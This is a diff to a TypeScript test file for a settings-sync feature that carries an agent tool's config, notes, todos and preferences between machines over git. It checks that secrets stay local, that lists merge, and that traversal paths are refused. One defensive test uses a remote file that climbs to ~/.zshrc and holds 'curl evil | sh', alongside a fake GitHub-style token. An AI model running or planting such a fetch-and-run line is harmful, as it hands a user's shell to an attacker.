@@ -2,10 +2,19 @@ import { afterEach, describe, expect, test } from "bun:test";
 import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import { applyLocal, canonicalJson, mergeFile, planSync, portablePath, localPath, portableText, readLocal, SettingsSync, sourceControlStore } from "./settings-sync";
-import { neverSynced, parseSyncSettings, SYNC_ITEMS } from "./shared/settings-sync";
-import { SourceControl } from "./source-control";
 import { runChecked } from "./proc";
+import { CalendarsFile } from "./server/calendars-file";
+import type { ListKind } from "./server/list-registry";
+import { PreferencesFile } from "./server/preferences-file";
+import { ProcessSettingsFile } from "./server/process-settings-file";
+import { UserNotesFile } from "./server/user-notes-file";
+import { UserTodosFile } from "./server/user-todos-file";
+import { WorkspacesFile } from "./server/workspaces-file";
+import { applyLocal, canonicalJson, localPath, mergeFile, mergeJson, planSync, portablePath, portableText, readLocal, SettingsSync, type SyncStore, sourceControlStore, syncStores } from "./settings-sync";
+import { neverSynced, parseSyncSettings, SYNC_ITEMS, type SyncStoreId } from "./shared/settings-sync";
+import { SourceControl } from "./source-control";
+import type { UserNoteChange } from "./user-notes-shared";
+import { addTodo } from "./user-todos";
 
 const dirs: string[] = [];
 afterEach(() => {
@@ -25,6 +34,12 @@ const put = (path: string, text: string | Uint8Array): void => {
 
 const text = (value: string) => ({ text: value, executable: false });
 
+/** Stores that read `values`, `{}` for the rest, and take whatever sync writes. */
+const fixedStores = (values: Partial<Record<SyncStoreId, unknown>> = {}): Record<SyncStoreId, SyncStore> => {
+	const store = (id: SyncStoreId): SyncStore => ({ read: () => values[id] ?? {}, parse: value => ({ ok: value }), write: () => {} });
+	return { "source-control": store("source-control"), notes: store("notes"), todos: store("todos"), preferences: store("preferences"), workspaces: store("workspaces"), calendars: store("calendars") };
+};
+
 describe("what syncs", () => {
 	test("never syncs credentials, databases, sessions, locks, or the dashboard's machine files, and every item's own path is allowed", () => {
 		for (const path of ["omp/agent.db", "omp/agent.db-wal", "omp/mcp.json", "omp/secrets.yml", "omp/secret-placeholder.key", "omp/sessions/a/b.jsonl", "omp/config.yml.lock", "omp/skills/x/.env", "omp/skills/x/id_ed25519", "omp/skills/x/node_modules/y.js", "dashboard/token", "dashboard/interrupted.json", "dashboard/merges.json", "dashboard/server.lock"]) {
@@ -34,7 +49,7 @@ describe("what syncs", () => {
 		expect(SYNC_ITEMS.filter(item => neverSynced(item.path))).toEqual([]);
 	});
 
-	test("reads only the portable files of omp's directory, and leaves links, binaries, and files holding a token on this machine", async () => {
+	test("reads only the portable files of omp's directory and the dashboard's lists, and leaves links, binaries, and anything holding a token on this machine", async () => {
 		const omp = scratch();
 		const elsewhere = scratch();
 		put(join(omp, "config.yml"), "theme: dark\n");
@@ -53,15 +68,21 @@ describe("what syncs", () => {
 		put(join(elsewhere, "SKILL.md"), "# Gamma\n");
 		symlinkSync(elsewhere, join(omp, "skills", "gamma"));
 		const settings = { on: false, repos: {}, cleanUp: true };
-		const { files, skipped } = await readLocal(SYNC_ITEMS, { omp, home: "/Users/nobody", stores: { "source-control": { read: () => settings, accepts: () => true, write: () => {} } } });
+		const notes = { notes: { n: { title: "GitHub", body: `ghp_${"b".repeat(36)}` } } };
+		const { files, skipped } = await readLocal(SYNC_ITEMS, { omp, home: "/Users/nobody", stores: fixedStores({ "source-control": settings, notes }) });
 		expect(Object.fromEntries(files)).toEqual({
 			"omp/config.yml": text("theme: dark\n"),
 			"omp/AGENTS.md": text("Be brief.\n"),
 			"omp/skills/alpha/SKILL.md": text("# Alpha\n"),
 			"omp/skills/alpha/run.sh": { text: "#!/bin/sh\n", executable: true },
 			"dashboard/source-control.json": text('{\n\t"cleanUp": true,\n\t"on": false,\n\t"repos": {}\n}\n'),
+			"dashboard/todos.json": text("{}\n"),
+			"dashboard/preferences.json": text("{}\n"),
+			"dashboard/workspaces.json": text("{}\n"),
+			"dashboard/calendars.json": text("{}\n"),
 		});
 		expect(skipped.sort((a, b) => a.path.localeCompare(b.path))).toEqual([
+			{ path: "dashboard/notes.json", reason: "credential" },
 			{ path: "omp/skills/alpha/logo.png", reason: "binary" },
 			{ path: "omp/skills/beta/SKILL.md", reason: "credential" },
 			{ path: "omp/skills/gamma", reason: "link" },
@@ -70,7 +91,7 @@ describe("what syncs", () => {
 });
 
 describe("a remote's paths", () => {
-	const stores = { "source-control": { read: () => ({}), accepts: () => true, write: () => {} } };
+	const stores = fixedStores();
 
 	test("a path that climbs out of its item is left on the remote and never planned for this machine", () => {
 		const remote = new Map(["omp/skills/../../../.zshrc", "omp/skills//x", "omp/skills/./x", "omp/skills/a/SKILL.md"].map(path => [path, text("x\n")]));
@@ -82,7 +103,7 @@ describe("a remote's paths", () => {
 		const home = scratch();
 		const omp = join(home, ".omp", "agent");
 		mkdirSync(join(omp, "skills"), { recursive: true });
-		await expect(applyLocal(SYNC_ITEMS, new Map([["omp/skills/../../../.zshrc", text("curl evil | sh\n")]]), { omp, home, stores })).rejects.toThrow("outside omp/skills");
+		await expect(applyLocal(SYNC_ITEMS, new Map([["omp/skills/../../../.zshrc", text("curl evil | sh\n")]]), { omp, home, stores }, new Map())).rejects.toThrow("outside omp/skills");
 		expect(existsSync(join(home, ".zshrc"))).toBe(false);
 	});
 });
@@ -119,6 +140,35 @@ describe("mergeFile", () => {
 	});
 });
 
+describe("mergeJson", () => {
+	const [a, b, c, d] = ["a", "b", "c", "d"].map(id => ({ id, text: id.toUpperCase() }));
+
+	test("keeps what each side added, merges an entry both changed, and drops what one side deleted and the other left alone", () => {
+		expect(mergeJson([a], [a, b], [a, c], undefined)).toEqual({ ok: [a, b, c] });
+		expect(mergeJson([a, b], [a], [a, b, c], undefined)).toEqual({ ok: [a, c] });
+		expect(mergeJson(["x"], ["x", "y"], [], undefined)).toEqual({ ok: ["y"] });
+		expect(mergeJson([a], [{ ...a, text: "A2" }], [{ ...a, done: true }], undefined)).toEqual({ ok: [{ id: "a", text: "A2", done: true }] });
+	});
+
+	test("conflicts on an entry one side deleted and the other changed, unless a side is chosen", () => {
+		const edited = { ...a, text: "A2" };
+		expect(mergeJson([a, b], [b], [edited, b], undefined)).toBeNull();
+		expect(mergeJson([a, b], [b], [edited, b], "local")).toEqual({ ok: [b] });
+		expect(mergeJson([a, b], [b], [edited, b], "remote")).toEqual({ ok: [edited, b] });
+	});
+
+	test("follows the side that reordered, with the other side's addition after the entry before it there, and conflicts on two orders", () => {
+		expect(mergeJson([a, b, c], [c, a, b], [a, d, b, c], undefined)).toEqual({ ok: [c, a, d, b] });
+		expect(mergeJson([a, b, c], [b, a, c], [a, c, b], undefined)).toBeNull();
+		expect(mergeJson([a, b, c], [b, a, c], [a, c, b], "remote")).toEqual({ ok: [a, c, b] });
+	});
+
+	test("keeps a list as one value when an entry has no identity or shares one", () => {
+		expect(mergeJson([{ url: "x" }], [{ url: "x" }, { url: "y" }], [{ url: "x" }, { url: "z" }], undefined)).toBeNull();
+		expect(mergeJson(["x"], ["x", "x"], ["x", "y"], undefined)).toBeNull();
+	});
+});
+
 describe("home paths", () => {
 	test("names the home directory as ~ in text and in paths, and not a sibling directory that starts the same", () => {
 		expect(portableText("notes: /Users/ann/notes, root: /Users/ann\nother: /Users/anna/x /data/Users/ann/y", "/Users/ann")).toBe("notes: ~/notes, root: ~\nother: /Users/anna/x /data/Users/ann/y");
@@ -151,16 +201,38 @@ describe("parseSyncSettings", () => {
 	});
 });
 
-/** One machine: its home, omp's directory, the dashboard's files, and its settings sync on `remote`. */
+/** One machine: its home, omp's directory, the dashboard's files, the lists a sync rewrote, and its settings sync on `remote`. */
 function machine(root: string, remote: string) {
 	const home = join(root, "home");
 	const omp = join(home, ".omp", "agent");
 	mkdirSync(omp, { recursive: true });
-	const sourceControl = new SourceControl(join(root, "config", "source-control.json"));
-	const sync = new SettingsSync(join(root, "config", "settings-sync.json"), join(root, "data", "settings-sync.git"), { omp, home, stores: { "source-control": sourceControlStore(sourceControl, home) } });
+	const config = (name: string): string => join(root, "config", name);
+	mkdirSync(config(""), { recursive: true });
+	const files = {
+		sourceControl: new SourceControl(config("source-control.json")),
+		notes: new UserNotesFile(config("notes.json")),
+		todos: new UserTodosFile(config("todos.json")),
+		preferences: new PreferencesFile(config("preferences.json")),
+		processes: new ProcessSettingsFile(config("processes.json")),
+		workspaces: new WorkspacesFile(config("workspaces.json")),
+		calendars: new CalendarsFile(config("calendars.json")),
+	};
+	const changed = new Set<ListKind>();
+	const places = { omp, home, stores: syncStores(files, home, list => changed.add(list)) };
+	const sync = new SettingsSync(config("settings-sync.json"), join(root, "data", "settings-sync.git"), places);
 	sync.configure({ remote, branch: "main", excluded: [] });
-	return { home, omp, sourceControl, sync };
+	return { home, omp, ...files, changed, places, sync };
 }
+
+/** Two machines on one new remote. */
+async function pair() {
+	const root = scratch();
+	const remote = join(root, "remote.git");
+	await runChecked(["git", "init", "--bare", "--quiet", remote]);
+	return { remote, a: machine(join(root, "a"), remote), b: machine(join(root, "b"), remote) };
+}
+
+const addNote = (id: string): UserNoteChange => ({ op: "add", note: { id, title: id, body: "", todoId: null, addedBy: null, createdAt: "2026-01-01T00:00:00.000Z", updatedAt: "2026-01-01T00:00:00.000Z" } });
 
 describe("SettingsSync", () => {
 	test("carries a change from one machine to another, changes nothing on a second sync, and stops on a conflict until a side is chosen", async () => {
@@ -175,7 +247,8 @@ describe("SettingsSync", () => {
 		put(agentsMd(a), `Notes live in ${a.home}/notes.\n`);
 		put(join(a.omp, "skills", "alpha", "SKILL.md"), "# Alpha\n");
 		a.sourceControl.apply({ op: "repo", repo: join(a.home, "code", "app"), on: true });
-		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: ["dashboard/source-control.json", "omp/AGENTS.md", "omp/skills/alpha/SKILL.md"] });
+		const sent = ["calendars", "notes", "preferences", "source-control", "todos", "workspaces"].map(name => `dashboard/${name}.json`);
+		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [...sent, "omp/AGENTS.md", "omp/skills/alpha/SKILL.md"] });
 		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: ["dashboard/source-control.json", "omp/AGENTS.md", "omp/skills/alpha/SKILL.md"], sent: [] });
 		expect(readFileSync(agentsMd(b), "utf8")).toBe("Notes live in ~/notes.\n");
 		expect(readFileSync(join(b.omp, "skills", "alpha", "SKILL.md"), "utf8")).toBe("# Alpha\n");
@@ -204,11 +277,7 @@ describe("SettingsSync", () => {
 	});
 
 	test("leaves an item the user turned off as it is on both sides", async () => {
-		const root = scratch();
-		const remote = join(root, "remote.git");
-		await runChecked(["git", "init", "--bare", "--quiet", remote]);
-		const a = machine(join(root, "a"), remote);
-		const b = machine(join(root, "b"), remote);
+		const { remote, a, b } = await pair();
 		put(join(a.omp, "AGENTS.md"), "From A.\n");
 		await a.sync.sync();
 		put(join(b.omp, "AGENTS.md"), "From B.\n");
@@ -216,6 +285,63 @@ describe("SettingsSync", () => {
 		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [] });
 		expect(readFileSync(join(b.omp, "AGENTS.md"), "utf8")).toBe("From B.\n");
 		expect(await runChecked(["git", "--git-dir", remote, "show", "main:omp/AGENTS.md"])).toBe("From A.\n");
+	});
+
+	test("keeps the todos and notes two machines each added, carries the preferences and workspaces, and settles both on one list", async () => {
+		const { remote, a, b } = await pair();
+		const [notes, preferences, todos, workspaces] = ["notes", "preferences", "todos", "workspaces"].map(name => `dashboard/${name}.json`);
+		await a.sync.sync();
+		await b.sync.sync();
+		a.todos.apply(addTodo({ id: "from-a", text: "From A" }));
+		a.notes.apply(addNote("note-a"));
+		a.preferences.apply({ op: "set", key: "omp-agents.theme", value: "dark" });
+		a.workspaces.apply({ op: "add", cwd: join(a.home, "code", "app") });
+		b.todos.apply(addTodo({ id: "from-b", text: "From B", status: "done" }));
+		b.notes.apply(addNote("note-b"));
+
+		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [notes, preferences, todos, workspaces] });
+		expect(await runChecked(["git", "--git-dir", remote, "show", `main:${workspaces}`])).toContain('"~/code/app"');
+		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [notes, preferences, todos, workspaces], sent: [notes, todos] });
+		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [notes, todos], sent: [] });
+		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [] });
+
+		for (const side of [a, b]) {
+			expect(side.todos.value.todos.map(todo => todo.id)).toEqual(["from-a", "from-b"]);
+			expect(side.notes.value.notes.map(note => note.id).sort()).toEqual(["note-a", "note-b"]);
+		}
+		expect(b.preferences.value).toEqual({ "omp-agents.theme": "dark" });
+		expect(b.workspaces.value.added).toEqual([join(b.home, "code", "app")]);
+		expect([...b.changed].sort()).toEqual(["preferences", "user-notes", "user-todos", "workspaces"]);
+		expect([...a.changed].sort()).toEqual(["user-notes", "user-todos"]);
+	});
+
+	test("stops on a todo one machine removed and the other edited, until a side is chosen", async () => {
+		const { a, b } = await pair();
+		a.todos.apply(addTodo({ id: "shared", text: "Ship it" }));
+		await a.sync.sync();
+		await b.sync.sync();
+		a.todos.apply({ op: "remove", id: "shared" });
+		await a.sync.sync();
+		b.todos.apply({ op: "edit", id: "shared", text: "Ship it today" });
+
+		expect((await b.sync.sync()).last).toMatchObject({ kind: "conflict", conflicts: [{ path: "dashboard/todos.json", item: "todos" }] });
+		expect(b.todos.value.todos.map(todo => todo.text)).toEqual(["Ship it today"]);
+		expect((await b.sync.sync({ "dashboard/todos.json": "local" })).last).toMatchObject({ kind: "synced", received: [], sent: ["dashboard/todos.json"] });
+		await a.sync.sync();
+		expect(a.todos.value.todos.map(todo => todo.text)).toEqual(["Ship it today"]);
+	});
+
+	test("keeps a todo added while a sync ran beside the one the sync brings", async () => {
+		const here = machine(scratch(), "unused");
+		const items = SYNC_ITEMS.filter(item => item.id === "todos");
+		const before = await readLocal(items, here.places);
+		here.todos.apply(addTodo({ id: "here", text: "Added here" }));
+		const there = new UserTodosFile(join(scratch(), "todos.json"));
+		there.apply(addTodo({ id: "there", text: "From the remote" }));
+
+		await applyLocal(items, new Map([["dashboard/todos.json", text(canonicalJson(there.json()))]]), here.places, before.files);
+		expect(here.todos.value.todos.map(todo => todo.id).sort()).toEqual(["here", "there"]);
+		expect([...here.changed]).toEqual(["user-todos"]);
 	});
 
 	test("reports a remote it cannot reach as a failed sync", async () => {
